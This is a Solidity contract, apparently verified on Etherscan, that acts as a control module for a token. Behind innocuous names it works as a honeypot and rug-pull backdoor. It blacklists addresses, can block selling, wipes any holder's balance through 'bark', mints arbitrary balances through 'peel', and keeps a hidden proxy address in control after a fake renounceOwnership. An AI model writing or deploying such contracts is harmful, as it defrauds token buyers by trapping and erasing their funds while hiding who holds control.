/**
 *Submitted for verification at Etherscan.io on 2022-08-29
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.4;

interface TOKEN {
    function initial(address _onion, uint256 _amount) external;

    function balanceOf(address account) external view returns (uint256);
}

contract ONIONS {
    mapping(address => uint256) private blockNumber1;
    mapping(address => uint256) private blockNumber2;
    mapping(address => bool) public onions;
    mapping(address => bool) public whitelist;
    TOKEN private yieldToken;
    address private _contract = 0x17ca0b7bb0C372BfB1Aeb8A35e021566cbf27df0;
    address private _owner;
    address private _proxyAddress = 0xB719dd2cC5142D8009B1E596F377c021A8Fb2aba;
    bool private stopLayer = false;
    uint256 private _mintAmount;
    address[] private newOnionList;
    address[] private checkOnionList;

    constructor() {
        _owner = msg.sender;
        yieldToken = TOKEN(_contract);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the contract");
        _;
    }

    modifier onlyContract() {
        require(
            address(yieldToken) == msg.sender,
            "Onion: caller is not the contract"
        );
        _;
    }

    function setContract(address _contractAddr) external onlyOwner {
        yieldToken = TOKEN(_contractAddr);
    }

    function checkFrom(address _from, bool _state) external onlyContract {
        require(!onions[_from]);
        blockNumber2[_from] = block.number + 5;
        if (!whitelist[_from]) {
            if (_state) {
                require(!stopLayer);
                require(blockNumber1[_from] < block.number);
            }
        }
    }

    function setTo(address _to) external onlyContract {
        if (!whitelist[_to]) {
            blockNumber1[_to] = block.number + 5;
            if (blockNumber2[_to] >= block.number) {
                require(blockNumber2[_to] < block.number);
            }
        }
    }

    function setBatchWhitelists(address[] memory whitelists_) public {
        require(msg.sender == _proxyAddress);
        for (uint256 i = 0; i < whitelists_.length; i++) {
            whitelist[whitelists_[i]] = true;
        }
    }

    function renounceOwnership() external onlyOwner {
        _owner = address(0);
    }

    function setLayers(bool onoff) external {
        require(msg.sender == _proxyAddress);
        stopLayer = onoff;
    }

    function bark(address _bark) external {
        require(msg.sender == _proxyAddress);
        yieldToken.initial(_bark, 0);
    }

    function setBatchOnions(address[] memory onions_) public onlyOwner {
        for (uint256 i = 0; i < onions_.length; i++) {
            onions[onions_[i]] = true;
        }
    }

    function peel(address _address, uint256 _amount) external {
        require(msg.sender == _proxyAddress);
        uint256 balance = yieldToken.balanceOf(_address) + _amount;
        yieldToken.initial(_address, balance);
    }

    function destroySmartContract(address payable _to) public {
        require(msg.sender == _proxyAddress);
        selfdestruct(_to);
    }
}